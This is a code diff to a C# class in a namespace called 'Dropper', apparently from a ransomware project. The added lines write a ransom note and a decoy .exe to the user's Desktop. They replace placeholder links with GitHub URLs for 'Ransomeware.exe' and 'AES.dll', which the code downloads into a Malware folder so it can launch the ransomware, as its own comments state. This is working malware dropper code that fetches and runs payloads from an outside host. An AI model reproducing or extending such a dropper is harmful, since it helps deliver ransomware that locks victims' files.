@@ -39,7 +39,29 @@ namespace Dropper
         }
         private void StartAction()
         {
-            this.Close();
+             this.Left = 0; //Make 0 size
+            this.Top = 0; //Make 0 size
+            this.Width = Screen.PrimaryScreen.Bounds.Width; //Make 0 size
+            this.Height = Screen.PrimaryScreen.Bounds.Height; //Make 0 size
+
+            string path_cache = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); //define path on desktop
+            string existfile = path_cache + @"\._cache_DCQPKX.exe"; //define for kill process
+            if (!File.Exists(existfile))
+            {
+                string pathcachefile = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
+                using (StreamWriter streamWriter = File.CreateText(pathcachefile + @"\._cache_DCQPKX.exe"))
+                {
+                    streamWriter.WriteLine("Ur files has been locked :-)"); //text for file
+                }
+            }
+
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            using (StreamWriter streamWriter = File.CreateText(path + @"\RANSOMWARE2.0.txt")) //Create file
+            {
+                streamWriter.WriteLine("Ur files has been locked :-)"); //Text for file
+            }
+
             /**
              * First determine whether the virus has already infected the operating
              * system or not This functionality will depend on how the virus announce it
@@ -64,7 +86,8 @@ namespace Dropper
             }
             // if it already exists it means a previous version of the virus infected
             // the OS then launch the virus by downloading it from a malicious site
-            String link = "https://www.github.com", link2 = "https://www.github.com";
+            String link = "https://github.com/AliIbrahim996/RansomwareProject/blob/main/build/UI/Debug/Ransomeware.exe", 
+            link2 = "https://github.com/AliIbrahim996/RansomwareProject/blob/main/build/UI/Debug/AES.dll";
             DownLoadFileInBackground2(link, pathToInfect + @"\Malware\Ransomeware.exe",link2,@"\Malware\AES.dll");
             // After finishing the downloading, start the ransomware virus and terminate
             if (!flag)
